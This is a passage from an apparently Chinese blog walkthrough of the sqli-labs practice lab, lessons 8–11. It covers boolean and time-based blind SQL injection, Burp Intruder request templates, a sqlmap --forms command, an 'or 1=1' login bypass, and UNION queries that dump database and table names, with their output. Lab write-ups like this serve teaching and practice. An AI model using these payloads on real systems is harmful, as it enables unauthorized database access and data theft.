&lt;p&gt;substr (a,b,c) 函数，显而易见是截断字符串 a，b 位置开始截取 c 个字符&lt;/p&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-8?id=1&amp;#x27; and (select length(database()))=8 %23+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;=8 时正常输出，说明当前数据库名字长度为 8&lt;/p&gt;
&lt;p&gt;上 bp, 选中 Intruder&lt;/p&gt;
&lt;p&gt;攻击模式可以选 sniper 也可以选 clusterbomb，都很方便，字典直接用 excel 下拉到 127 的…，一个一个打也太费劲了把&lt;/p&gt;
&lt;p&gt;从 1 到 127 一个一个猜数据库名中的字符，根据返回数据的长度不同找到正确的 ascii 码值：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GET /Less-8/?id=1%27%20and%20(select%20ascii(substr(database(),§1§,1)))=§115§%20%23+ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateDNT: 1Connection: keep-aliveUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里就不上 bp 图了，不好搞，用的笛卡尔乘积，发了一千多个请求就爆了个当前数据库名，要爆别的在上面 payload 改改完事：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;request&lt;/th&gt;
&lt;th&gt;payload1&lt;/th&gt;
&lt;th&gt;payload2&lt;/th&gt;
&lt;th&gt;status&lt;/th&gt;
&lt;th&gt;timeout&lt;/th&gt;
&lt;th&gt;error&lt;/th&gt;
&lt;th&gt;length&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;950&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;787&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;99&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;950&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;802&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;101&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;950&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;838&lt;/td&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;105&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;950&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;909&lt;/td&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;114&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;950&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;913&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;115&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;950&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;927&lt;/td&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;116&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;950&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;932&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;117&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;950&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;968&lt;/td&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;td&gt;121&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;950&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;966&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;966&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;966&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;966&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;966&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;966&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;总结-8&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-8&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;盲注一个个手打的话就是很费时间，疲惫&lt;/p&gt;
&lt;p&gt;有 sqlmap 真好&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;less-9&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-9&#34;&gt;#&lt;/a&gt; Less-9&lt;/h1&gt;
&lt;p&gt;date：2020-11-21 15:10:01&lt;/p&gt;
&lt;h2 id=&#34;过程-9&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-9&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;h3 id=&#34;sqlmap-9&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-9&#34;&gt;#&lt;/a&gt; sqlmap&lt;/h3&gt;
&lt;p&gt;同 less-1&lt;/p&gt;
&lt;h3 id=&#34;手工注入-9&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工注入-9&#34;&gt;#&lt;/a&gt; 手工注入&lt;/h3&gt;
&lt;p&gt;不管输入什么都是正常输出，明明输入的 id 数据库里面就没有，还说 you are in，用户体验差评：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Welcome    DhakkanYou are in...........&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;利用 if () 函数进行时间盲注，发现闭合单引号的时候它就一直睡觉咯&lt;/p&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-9?id=1&amp;#x27; and if((1=2),1,sleep(2333)) %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;和布尔盲注类似，但是是根据服务器响应的时间长短进行判断了，开干&lt;/p&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-9?id=1&amp;#x27; and if((length(database())=8),sleep(2333),1) %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;判断出 database () 的长度是 8 个字符，还是接着上 bp：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GET /Less-9/?id=1%27%20and%20if((ascii(substr(database(),§1§,1))=§115§),sleep(11),1)%20%23 HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateDNT: 1Connection: keep-aliveUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;bp 的 result，根据 ascii 值就可以吧当前数据名弄出来了：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;request&lt;/th&gt;
&lt;th&gt;payload1&lt;/th&gt;
&lt;th&gt;payload2&lt;/th&gt;
&lt;th&gt;status&lt;/th&gt;
&lt;th&gt;timeout&lt;/th&gt;
&lt;th&gt;error&lt;/th&gt;
&lt;th&gt;length&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;988&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;787&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;99&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;988&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;802&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;101&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;988&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;838&lt;/td&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;105&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;988&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;909&lt;/td&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;114&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;988&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;913&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;115&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;988&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;927&lt;/td&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;116&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;988&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;932&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;117&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;988&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;968&lt;/td&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;td&gt;121&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;988&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;951&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;951&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;951&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;td&gt;951&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;总结-9&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-9&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;其实想节省时间可以去看数据库的命名规范，确定要测试的字符有哪些，这样在进行大量数据测试的时候会节省一些时间&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;less-10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-10&#34;&gt;#&lt;/a&gt; Less-10&lt;/h1&gt;
&lt;p&gt;date：2020-11-21 15:55:10&lt;/p&gt;
&lt;h2 id=&#34;过程-10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-10&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;h3 id=&#34;sqlmap-10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-10&#34;&gt;#&lt;/a&gt; sqlmap&lt;/h3&gt;
&lt;p&gt;同 less-1&lt;/p&gt;
&lt;h3 id=&#34;手工注入-10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工注入-10&#34;&gt;#&lt;/a&gt; 手工注入&lt;/h3&gt;
&lt;p&gt;和 less-9 相比就是单引号闭合变成了双引号闭合&lt;/p&gt;
&lt;p&gt;用这个 payload，服务器就睡觉啦：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.sqli-labs.com/Less-10?id=1&amp;quot; and if((1=1),sleep(2333),1) %23+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;后面的流程和 less-9 一样&lt;/p&gt;
&lt;h2 id=&#34;总结-10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-10&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;遇到这个题目也不知道是该开心还是该开心&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;less-11&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-11&#34;&gt;#&lt;/a&gt; Less-11&lt;/h1&gt;
&lt;p&gt;date：2020-11-21 16:23:25&lt;/p&gt;
&lt;h2 id=&#34;过程-11&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-11&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;写完时间盲注的我，看见这道题目，眼前一亮！终于换题目啦哈哈哈哈哈哈哈嗝&lt;/p&gt;
&lt;h3 id=&#34;sqlmap-11&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-11&#34;&gt;#&lt;/a&gt; sqlmap&lt;/h3&gt;
&lt;p&gt;sqlmap 测 post 请求可以用参数 forms&lt;/p&gt;
&lt;p&gt;这里用的–forms 参数，直接搞到所有数据库了：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;py sqlmap.py -u http://www.sqli-labs.com/Less-11 --forms --dbs --batch&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;后面爆字段值改参数就可以了，同 less-1&lt;/p&gt;
&lt;h3 id=&#34;手工注入-11&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工注入-11&#34;&gt;#&lt;/a&gt; 手工注入&lt;/h3&gt;
&lt;p&gt;看见登录框就想 admin/123456 登录（竟然失败了！气人！）&lt;/p&gt;
&lt;p&gt;抓包看见的是 post 请求，所以不能和之前一样直接在 url 后面接参数了，那就在输入框直接注入哈哈哈&lt;/p&gt;
&lt;p&gt;payload，username 最后面有个空格，不加空格注释符号和后面的符号连接在一起，就起不到注释的功能啦:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Username :    admin&amp;#x27; or 1=1 -- Password :    123456&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:DumbYour Password:Dumb&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;有数据回显，舒服了&lt;/p&gt;
&lt;p&gt;上 bp 抓包，直接改后面的参数，根据 order by 确定需要两个字段：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /Less-11/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-11/Content-Type: application/x-www-form-urlencodedContent-Length: 51Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin%27 order by 2+--+&amp;amp;passwd=&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出，竟然真的有一个 admin/admin…：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;br&amp;gt;Your Login name:admin&amp;lt;br&amp;gt;Your Password:admin&amp;lt;br&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;爆数据库 payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=zhatian%27 union select 1,group_concat(schema_name) from information_schema.schemata+--+&amp;amp;passwd=&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;br&amp;gt;Your Login name:1&amp;lt;br&amp;gt;Your Password:information_schema,bookstore,challenges,dvwa,edusys,exam,fresh,hotel,hy,hy2,mysql,news,pentest,performance_schema,pikachu,security,store,student,test,vote&amp;lt;br&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;爆表 payload:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=zhatian%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()+--+&amp;amp;passwd=&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;br&amp;gt;Your Login name:1&amp;lt;br&amp;gt;Your Password:emails,referers,uagents,users&amp;lt;br&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;爆字段:&lt;/p&gt;
